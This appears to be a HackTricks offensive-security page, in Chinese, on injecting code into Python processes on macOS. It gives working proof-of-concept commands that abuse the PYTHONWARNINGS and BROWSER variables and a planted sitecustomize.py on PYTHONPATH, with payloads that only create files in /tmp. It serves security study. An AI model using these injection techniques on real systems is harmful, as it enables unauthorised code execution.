# macOS Python Application Injection

{{#include ../../../banners/hacktricks-training.md}}

## 通过 `PYTHONWARNINGS` 和 `BROWSER` 环境变量

如果攻击者能够控制 Python 进程的环境，那么在 Python 处理构造的 warning 选项时导入 `antigravity` module，`PYTHONWARNINGS` 和 `BROWSER` 的组合可以触发 command execution。该技术依赖于 `antigravity` 使用 Python 的 `webbrowser` module 打开 URL，而 `webbrowser` 会遵循 `BROWSER` 环境变量。<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## 通过 `PYTHONPATH` 和 `sitecustomize.py`

在正常启动期间，Python 的 `site` 模块会添加特定于 site 的路径，然后尝试导入名为 `sitecustomize` 的模块。通过将攻击者可读取的目录置于 `PYTHONPATH` 的首位，控制进程环境的攻击者可以让 Python 在目标脚本之前导入 payload。`-S` 标志会禁用自动的 `site` 初始化，而隔离模式（`-I`）会忽略 `PYTHONPATH`，并隐含启用 `-s` 和 `-E`。<sup>[[2]](#references)[[3]](#references)</sup>
```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```
## References

- [1] [使用 Environment Variables 进行 Hacking - elttam](https://www.elttam.com/blog/env/)
- [2] [site — Site-specific configuration hook](https://docs.python.org/3/library/site.html)
- [3] [Python 命令行和环境](https://docs.python.org/3/using/cmdline.html)
{{#include ../../../banners/hacktricks-training.md}}
